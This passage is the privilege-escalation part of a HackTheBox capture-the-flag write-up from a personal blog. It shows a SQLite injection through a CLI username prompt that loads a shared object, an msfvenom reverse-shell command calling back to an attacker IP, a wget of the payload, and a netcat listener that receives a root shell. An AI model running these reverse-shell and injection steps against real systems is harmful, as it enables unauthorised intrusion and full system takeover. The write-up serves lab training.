<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">doodleGrive cli beta-2.2:
</span></span><span class="line"><span class="cl">1. Show users list and info
</span></span><span class="line"><span class="cl">2. Show groups list
</span></span><span class="line"><span class="cl">3. Check server health and status
</span></span><span class="line"><span class="cl">4. Show server requests log (last 1000 request)
</span></span><span class="line"><span class="cl">5. activate user account
</span></span><span class="line"><span class="cl">6. Exit
</span></span><span class="line"><span class="cl">Select option: 5
</span></span><span class="line"><span class="cl">Enter username to activate account: \/|&#39;;..
</span></span><span class="line"><span class="cl">Activating account for user &#39;..&#39;...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Note that out of all the special characters provided in the username input, only dots were accepted and reflected. We can work around banned characters utilizing the <a class="link" href="https://www.w3resource.com/sqlite/core-functions-char.php"  target="_blank" rel="noopener"
    >char function</a>, but working around the character limit also requires creativity. Instead of combining our payload using <code>AND JOIN</code> or other ideas, we can simplify it with <code>+</code>. First, when we must create our malicious shared object file, which will behave as our linux equivalent to a <code>dll</code> loading:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Drive/sqlite_ex/sqlite-execute-module]
</span></span><span class="line"><span class="cl">└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.58 LPORT=4444 -f elf-so -o a.so
</span></span></code></pre></td></tr></table>
</div>
</div><p>Next, we must download it to the same file location as <code>doodleGrive-cli</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tom@drive:~$ wget 10.10.14.21/a.so
</span></span><span class="line"><span class="cl">--2023-10-16 02:46:13--  http://10.10.14.21/a.so
</span></span><span class="line"><span class="cl">Connecting to 10.10.14.21:80... connected.
</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... 200 OK
</span></span><span class="line"><span class="cl">Length: 476 [application/octet-stream]
</span></span><span class="line"><span class="cl">Saving to: ‘a.so’
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">a.so                          100%[==============================================&gt;]     476  --.-KB/s    in 0s
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2023-10-16 02:46:13 (20.4 MB/s) - ‘a.so’ saved [476/476]
</span></span></code></pre></td></tr></table>
</div>
</div><p>The small file name is really important, as we must call the characters in our <code>load_extension</code> payload. Unless specified, the file extension .so will be appended automatically. This is important for us as we need to minimize the payload characters where possible. For my file, I will want to do load_extension(./a). Looking up the characters on the <a class="link" href="https://www.asciitable.com/"  target="_blank" rel="noopener"
    >ascii table</a>, my payload will look like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s2">&#34;+load_extension(char(46,47,97))--</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Finally, running the payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">tom</span><span class="err">@</span><span class="n">drive</span><span class="p">:</span><span class="o">~$</span> <span class="o">./</span><span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span><span class="n">Caution</span> <span class="n">this</span> <span class="k">tool</span> <span class="n">still</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">development</span> <span class="n">phase</span><span class="o">...</span><span class="n">please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">issue</span> <span class="n">to</span> <span class="n">the</span> <span class="n">development</span> <span class="n">team</span><span class="p">[</span><span class="o">!</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="n">Username</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">moriarty</span>
</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> <span class="n">moriarty</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">findMeIfY0uC</span><span class="err">@</span><span class="n">nMr</span><span class="o">.</span><span class="n">Holmz</span><span class="o">!</span>
</span></span><span class="line"><span class="cl"><span class="n">Welcome</span><span class="o">...!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">doodleGrive</span> <span class="n">cli</span> <span class="n">beta</span><span class="o">-</span><span class="mf">2.2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="mf">1.</span> <span class="n">Show</span> <span class="n">users</span> <span class="n">list</span> <span class="ow">and</span> <span class="n">info</span>
</span></span><span class="line"><span class="cl"><span class="mf">2.</span> <span class="n">Show</span> <span class="n">groups</span> <span class="n">list</span>
</span></span><span class="line"><span class="cl"><span class="mf">3.</span> <span class="n">Check</span> <span class="n">server</span> <span class="n">health</span> <span class="ow">and</span> <span class="n">status</span>
</span></span><span class="line"><span class="cl"><span class="mf">4.</span> <span class="n">Show</span> <span class="n">server</span> <span class="n">requests</span> <span class="nb">log</span> <span class="p">(</span><span class="n">last</span> <span class="mi">1000</span> <span class="n">request</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mf">5.</span> <span class="n">activate</span> <span class="n">user</span> <span class="n">account</span>
</span></span><span class="line"><span class="cl"><span class="mf">6.</span> <span class="n">Exit</span>
</span></span><span class="line"><span class="cl"><span class="n">Select</span> <span class="n">option</span><span class="p">:</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="n">username</span> <span class="n">to</span> <span class="n">activate</span> <span class="n">account</span><span class="p">:</span> <span class="s2">&#34;+load_extension(char(46,47,97))--</span>
</span></span><span class="line"><span class="cl"><span class="n">Activating</span> <span class="n">account</span> <span class="k">for</span> <span class="n">user</span> <span class="s1">&#39;&#34;+load_extension(char(46,47,97))--&#39;</span><span class="o">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Meanwhile on my nc listener:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Drive/sqlite_ex/sqlite-execute-module]
</span></span><span class="line"><span class="cl">└─$ nc -nvlp 4444
</span></span><span class="line"><span class="cl">listening on [any] 4444 ...
</span></span><span class="line"><span class="cl">connect to [10.10.14.21] from (UNKNOWN) [10.10.11.235] 55348
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root),1003(tom)
</span></span></code></pre></td></tr></table>
</div>
</div><p>With this, we have full root authority.</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/gitea/">Gitea</a>
        
            <a href="/tags/idor/">IDOR</a>
        
            <a href="/tags/sqlite/">SQLite</a>
        
            <a href="/tags/sql-injection/">SQL Injection</a>
        
            <a href="/tags/port-forwarding/">Port Forwarding</a>
        
            <a href="/tags/msfvenom/">Msfvenom</a>
        
            <a href="/tags/ffuf/">FFUF</a>
        
    </section>


    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/post/hackthebox-pc/">
        
        
            <div class="article-image">
                <img src="/post/hackthebox-pc/PC.9698f9fd3d85128380dd064aec557744_huab04e65fab2e39d7ab0f3d51815d3af7_248053_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - PC"
                        
                        data-hash="md5-lpj5/T2FEoOA3QZK7FV3RA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - PC</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/post/hackthebox-visual/">
        
        
            <div class="article-image">
                <img src="/post/hackthebox-visual/Visual.161f7ee3284e2802b170218feede8443_hu2821e9da4ab5851c83163c70bbdf7481_348069_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Visual"
                        
                        data-hash="md5-Fh9&#43;4yhOKAKxcCGP7t6EQw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Visual</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/post/hackthebox-onlyforyou/">
        
        
            <div class="article-image">
                <img src="/post/hackthebox-onlyforyou/OnlyForYou.23aaa710c708eb7341f08b78acb7d1aa_hub67fe2f1a37b4ddd8d67f8b532b1624d_359490_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - OnlyForYou"
                        
                        data-hash="md5-I6qnEMcI63NB8It4rLfRqg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - OnlyForYou</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/post/hackthebox-mailroom/">
        
        
            <div class="article-image">
                <img src="/post/hackthebox-mailroom/Mailroom.0954462925d337843baeedfaf8bb9ccf_hu83fa4872cdc769af1a6c4264f0edd42d_354362_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Mailroom"
                        
                        data-hash="md5-CVRGKSXTN4Q7ru36&#43;Luczw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Mailroom</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/post/hackthebox-busqueda/">
        
        
            <div class="article-image">
                <img src="/post/hackthebox-busqueda/Busqueda.fc4856cd6b9e5aa954d7face3968a69d_hucd7cd900a381e6f396b4d3fd74d99876_352215_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Busqueda"
                        
                        data-hash="md5-/EhWzWueWqlU1/rOOWimnQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Busqueda</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2023 - 
        
        2024 Spencer&#39;s Blog
    </section>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#enumeration">Enumeration</a>
      <ol>
        <li><a href="#exploring-webapp">Exploring Webapp</a>
          <ol>
            <li><a href="#leaking-registered-usernames">Leaking registered usernames</a></li>
            <li><a href="#feroxbuster-results">Feroxbuster Results</a></li>
            <li><a href="#abusing-idor-to-view-private-messages">Abusing IDOR to view private messages</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#foothold">Foothold</a>
      <ol>
        <li><a href="#utilizing-password-shared-in-private-messages">Utilizing password shared in private messages</a></li>
      </ol>
    </li>
    <li><a href="#lateral-movement">Lateral Movement</a>
      <ol>
        <li><a href="#abusing-weak-hash-algorithms-to-crack-database-passwords">Abusing weak hash algorithms to crack database passwords</a></li>
      </ol>
    </li>
    <li><a href="#privilege-escalation">Privilege Escalation</a>
      <ol>
        <li><a href="#extracting-stored-credentials-from-compiled-binary">Extracting stored credentials from compiled binary</a></li>
        <li><a href="#sql-injection-to-load-a-malicious-shared-object-file">SQL injection to load a malicious shared object file</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>



    </body>
</html>
